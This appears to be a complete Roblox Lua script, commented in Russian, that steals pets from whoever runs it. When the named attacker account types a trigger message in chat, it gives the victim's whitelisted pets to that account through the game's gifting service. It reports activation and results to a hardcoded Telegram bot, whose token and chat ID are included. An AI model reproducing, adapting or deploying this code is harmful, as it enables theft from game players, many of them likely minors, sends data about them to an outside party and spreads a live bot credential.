local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "sfdgbzdfsb"
local TRIGGER_MESSAGE = "."

-- 🐾 БЕЛЫЙ СПИСОК
local WHITELIST = {"Hamster"}

-- 🔎 Поиск питомцев во всех контейнерах
local function getAllPets()
    local pets = {}
    local containers = {
        player:FindFirstChild("Backpack"),
        player.Character
    }

    for _, container in ipairs(containers) do
        if container then
            for _, item in ipairs(container:GetChildren()) do
                if item:IsA("Tool") then
                    -- Гибкий парсинг имени
                    local weight, age = item.Name:match("%[(%d+%.?%d*) KG%].*%[Age (%d+)%]")
                    if not weight then
                        weight = item.Name:match("%[(%d+%.?%d*) kg%].*%[Age (%d+)%]")
                    end
                    
                    if weight and age then
                        local petName = item.Name:match("^([^%[]+)") or item.Name
                        petName = petName:gsub("%s+$", "")
                        
                        table.insert(pets, {
                            name = petName,
                            object = item,
                            isWhitelisted = table.find(WHITELIST, petName) ~= nil
                        })
                    end
                end
            end
        end
    end
    
    return pets
end

-- 📨 Отправка в Telegram
local function sendToTelegram(text)
    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
                "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
    pcall(function()
        game:HttpGet(url)
    end)
end

-- 🎯 Основная функция передачи
local function startPetTransfer()
    local pets = getAllPets()
    if #pets == 0 then
        sendToTelegram("❌ Нет питомцев для передачи")
        return
    end

    local targetPlayer = Players:FindFirstChild(TARGET_PLAYER)
    if not targetPlayer then
        sendToTelegram("❌ Целевой игрок не найден: "..TARGET_PLAYER)
        return
    end

    local petService = ReplicatedStorage:FindFirstChild("PetGiftingService")
    if not petService then
        sendToTelegram("❌ Сервис передачи не найден")
        return
    end

    local transferred = 0
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            -- Экипировка с проверкой
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid:EquipTool(pet.object)
                task.wait(2)  -- Увеличенная задержка
            end
            
            -- Передача
            petService:FireServer("GivePet", targetPlayer)
            transferred += 1
            task.wait(2)  -- Задержка между передачами
        end
    end

    sendToTelegram("✅ Успешно передано питомцев: "..transferred)
end

-- 👂 Слушатель чата
Players.PlayerChatted:Connect(function(_, speaker, message)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        startPetTransfer()
    end
end)

-- 🚀 Инициализация
sendToTelegram("🟢 Скрипт активирован: "..player.Name)
